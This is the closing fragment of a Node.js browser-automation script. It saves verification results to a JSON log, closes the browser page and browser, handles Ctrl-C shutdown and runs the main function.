        timestamp: new Date().toISOString(),
        summary: { confirmed, invalid, skipped, errors },
        results: verificationResults
      };
      
      await fs.promises.writeFile(verificationLogPath, JSON.stringify(logData, null, 2));
      console.log(`\n📄 Verification results saved to: ${verificationLogPath}`);
      
    } finally {
      // Close the page we used for verification
      if (page) {
        await page.close().catch(() => {});
      }
      await browser.close().catch(() => {});
    }
    
  } catch (error) {
    console.error(`💥 Error in verification mode: ${error.message}`);
  }
}

// Handle graceful shutdown
process.on('SIGINT', async () => {
  console.log('\n\n⏹️  Shutting down gracefully...');
  rl.close();
  process.exit(0);
});

main().catch((e) => {
  console.error("💥 Fatal error:", e);
  rl.close();
  process.exit(1);
});
